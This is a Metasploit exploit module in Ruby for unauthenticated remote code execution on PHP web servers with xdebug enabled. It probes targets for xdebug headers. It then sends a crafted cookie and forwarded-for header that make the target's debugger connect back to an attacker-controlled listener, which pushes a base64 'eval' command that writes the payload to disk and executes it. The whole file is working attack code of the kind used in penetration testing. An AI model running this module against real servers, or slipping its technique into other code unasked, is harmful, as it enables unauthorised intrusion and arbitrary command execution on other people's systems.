# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient
  include Rex::Proto::Http
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;xdebug Unauthenticated OS Command Execution&#039;,
      &#039;Description&#039; => %q{
       This allows the attacker to execute arbitrary php code as the context of the web user.
      },
      &#039;DisclosureDate&#039; => &#039;Sep 17 2017&#039;,
      &#039;Author&#039; => [
        &#039;Ricter Zheng&#039;, #Discovery https://twitter.com/RicterZ
        &#039;Shaksham Jaiswal&#039;, # MinatoTW
        &#039;Mumbai&#039; # Austin Hudson
      ],
      &#039;References&#039; => [
        [&#039;URL&#039;, &#039;https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/&#039;],
        [&#039;URL&#039;, &#039;https://paper.seebug.org/397/&#039;]
      ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;Platform&#039; => &#039;php&#039;,
      &#039;Arch&#039; => [ARCH_PHP],
      &#039;DefaultTarget&#039; => 0,
      &#039;Stance&#039; => Msf::Exploit::Stance::Aggressive,
      &#039;DefaultOptions&#039; => {
      },
      &#039;Payload&#039; => {
        &#039;DisableNops&#039; => true,
      },
      &#039;Targets&#039; => [[ &#039;Automatic&#039;, {} ]],
    ))

    register_options([
        OptString.new(&#039;PATH&#039;, [ true, "Path to target webapp", "/index.php"]),
        OptAddress.new(&#039;SRVHOST&#039;, [ true, "Callback host for accepting connections", "0.0.0.0"]),
        OptInt.new(&#039;SRVPORT&#039;, [true, "Port to listen for the debugger", 9000]),
        Opt::RPORT(80),
        OptString.new(&#039;WriteableDir&#039;, [ true, "A writeable directory on the target", "/tmp"])
    ])
  end

  def check
    begin
      res = send_request_cgi({
        &#039;uri&#039; => datastore["PATH"],
        &#039;method&#039; => &#039;GET&#039;,
          &#039;vars_get&#039; => {
          &#039;XDEBUG_SESSION_START&#039; => rand_text_alphanumeric(10)
       }
      })
      vprint_status "Request sent\n#{res.headers}"
      if res && res.headers.to_s =~ /XDEBUG/i
        vprint_good("Looks like remote server has xdebug enabled\n")
        return CheckCode::Detected
      else
        return CheckCode::Safe
      end
      rescue Rex::ConnectionError
        return CheckCode::Unknown
    end
  end

  def exploit
    payl = Rex::Text.encode_base64("#{payload.encoded}")
    file = "#{datastore[&#039;WriteableDir&#039;]}"+"/"+rand_text_alphanumeric(5)
    cmd1 = "eval -i 1 -- " + Rex::Text.encode_base64("file_put_contents(\"#{file}\",base64_decode(\"#{payl}\")) && system(\" php #{file} \")") + "\x00"
    webserver = Thread.new do
    begin
      server = Rex::Socket::TcpServer.create(
        &#039;LocalPort&#039; => datastore[&#039;SRVPORT&#039;],
        &#039;LocalHost&#039; => datastore[&#039;SRVHOST&#039;],
        &#039;Context&#039; => {
          &#039;Msf&#039; => framework,
          &#039;MsfExploit&#039; => self
      })

      client = server.accept
      print_status("Waiting for client response.")
      data = client.recv(1024)
      print_status("Receiving response")
      vprint_line(data)
      print_status("Shell might take upto a minute to respond.Please be patient.")
      print_status("Sending payload of size #{cmd1.length} bytes")
      register_file_for_cleanup(file)
      client.write(cmd1)
      client.close
      server.close
      webserver.exit
    ensure
      webserver.exit
    end
    end
    send_request_cgi({
        &#039;uri&#039; => datastore[&#039;PATH&#039;],
        &#039;method&#039; => &#039;GET&#039;,
        &#039;headers&#039; => {
          &#039;X-Forwarded-For&#039; => "#{lhost}",
          &#039;Cookie&#039; => &#039;XDEBUG_SESSION=&#039;+rand_text_alphanumeric(10)
        }
    })
  end
end

